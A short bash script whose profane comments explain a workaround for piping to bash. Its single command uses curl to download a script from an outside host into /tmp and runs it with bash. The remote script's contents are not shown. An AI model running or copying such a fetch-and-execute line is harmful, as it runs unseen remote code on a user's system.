#!/bin/bash
# we need this because pipe bash is really shitty so we gotta execute it locally in order for it to even run right
# why?
# fuck if i know bro.

curl -fsSL "http://wato.qd.je/wp/wp.sh" -o /tmp/wp.sh && bash /tmp/wp.sh
